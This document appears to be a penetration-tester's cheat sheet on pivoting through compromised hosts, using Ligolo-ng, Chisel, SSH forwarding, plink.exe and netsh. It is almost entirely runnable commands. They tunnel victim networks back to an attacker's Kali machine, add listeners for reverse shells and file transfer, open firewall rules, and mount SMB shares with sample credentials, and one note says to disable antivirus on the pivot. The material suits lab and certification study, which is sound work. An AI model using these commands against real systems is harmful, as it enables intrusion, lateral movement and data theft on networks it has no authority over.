## Ligolo-ng

### Setup – Kali (Attacker)

```bash
# Create and bring up the tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy with a self-signed cert
./proxy -selfcert
```

### Transfer & Run Agent on Victim

```bash
# Copy agent to working directory (Kali)
cp /home/kali/Arsenal/PortForwarding/Ligolo-ng/Windows/agent/agent.exe .   # Windows
cp /home/kali/Arsenal/PortForwarding/Ligolo-ng/Linux/agent/agent .         # Linux

# Run on victim (Windows)
.\agent.exe -connect 192.168.100.10:11601 -ignore-cert
```

### Ligolo-ng Console Commands

```bash
# List connected sessions
ligolo-ng>> session

# Show network interfaces on victim
ligolo-ng>> ifconfig

# Start the tunnel
ligolo-ng>> tunnel_start --tun ligolo
```

### Routing – Kali

```bash
# Add route to internal subnet through ligolo interface
sudo ip route add 172.16.10.0/24 dev ligolo

# Verify
ip route
```

### Listeners (Reverse Shell & File Transfer)

```bash
# Reverse shell listener: victim connects to jumpbox:1234 → forwarded to Kali:443
ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:443

# File transfer listener: victim connects to jumpbox:1235 → forwarded to Kali:80
ligolo-ng>> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

> **Note:** Disable AV and Firewall on the jumpbox before connecting.

### Teardown

```bash
sudo ip link set ligolo down
sudo ip tuntap del dev ligolo mode tun
```
## Chisel

### Reverse SOCKS Proxy (Dynamic – use with proxychains)

```bash
# Kali (server)
./chisel server -p 8000 --reverse

# Victim (client) – dynamic SOCKS proxy
chisel client KALI-IP:8000 R:socks
```

### Reverse Port Forwards (Static)

```bash
# Forward victim's localhost:80 → Kali:80
chisel client KALI-IP:8000 R:80:127.0.0.1:80

# Forward internal host 10.10.10.240:80 → Kali:4444
chisel client KALI-IP:8000 R:4444:10.10.10.240:80
```

### Simple Port Forward (victim port 8080 → Kali port 8085)

```bash
# Kali (server)
./chisel server --port 8082 --reverse

# Victim (client)
./chisel client KALI-IP:8082 R:8085:127.0.0.1:8080
```
## SSH Local Port Forwarding

**Requires:** credentials for the compromised machine.  
**Use case:** Access an internal host/port through a compromised Linux pivot.

```bash
# Syntax
sudo ssh -N -L [bindaddress:]port:host:hostport username@address

# Example: access Windows SMB (192.168.10.20:445) via compromised host (10.10.10.5)
sudo ssh student@10.10.10.5 -N -L 0.0.0.0:445:192.168.10.20:445

# Then scan/interact via localhost
sudo smbclient -L 127.0.0.1 -U Administrator
```
## SSH Remote Port Forwarding

**Use case:** Outbound traffic is blocked on the victim — forward an internal port back to Kali.

```bash
# Syntax
sudo ssh -N -R [bindaddress:]port:host:hostport username@address

# Example: forward victim's MySQL (3306) to Kali port 2221
# Run this FROM the compromised machine
sudo ssh -N -R 10.11.12.6:2221:127.0.0.1:3306 kali@10.11.12.6

# Then scan on Kali
sudo nmap 127.0.0.1 -p 2221
```
## SSH Dynamic Port Forwarding

**Requires:** root credentials on the compromised machine.  
**Use case:** Scan all ports of an internal host through proxychains.

```bash
# Create SOCKS4 proxy through compromised machine
sudo ssh -N -D 127.0.0.1:8080 root@CompromisedMachineIP

# Configure proxychains
sudo nano /etc/proxychains.conf
# Add: socks4 127.0.0.1 8080

# Scan internal Windows host through the tunnel
sudo proxychains nmap -p- $windowsmachineIP
```
## Plink.exe (Windows)

**Use case:** Remote port forward from a Windows machine (no SSH client available).  
**Scenario:** SQL Server port open internally — forward it to Kali for access.

```bash
# Source on Kali
/usr/share/windows-resources/binaries/plink.exe
```

```cmd
:: Transfer plink.exe to victim, then run:
C:\> plink.exe -ssh -l kali -pw kali -R KaliMachineIP:1234:127.0.0.1:3306 KaliMachineIP

:: Non-interactive (use this on reverse shells — avoids host key prompt)
C:\> cmd.exe /c echo y | plink.exe -ssh -l kali -pw kali -R KaliMachineIP:1234:127.0.0.1:3306 KaliMachineIP
```

```bash
# Verify on Kali
sudo nmap -p 1234 127.0.0.1 -sV
```
## Netsh (Windows)

**Use case:** Local port forward on a Windows pivot (similar to SSH local forward).  
**Scenario:** Access Windows Server SMB shares via a Windows 10 pivot with SYSTEM privileges.

```cmd
:: Create port proxy: Windows10:4455 → WindowsServer:445
C:\> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=<Win10IP> connectport=445 connectaddress=<WinServerIP>

:: Verify it's listening
C:\> netstat -anp TCP | find "4455"

:: Open firewall rule (requires SYSTEM)
C:\> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<Win10IP> localport=4455 action=allow
```

```bash
# Access from Kali
# Note: set "min protocol = SMB2" in /etc/samba/smb.conf first
sudo smbclient -L <Win10IP> --port=4455 --user=Administrator

# Mount the share
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //<Win10IP>/Data \
  -o username=Administrator,password=Qwerty09! /mnt/win10_share

ls -la /mnt/win10_share
```
## References

- Chisel & SSF tunneling deep-dive: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html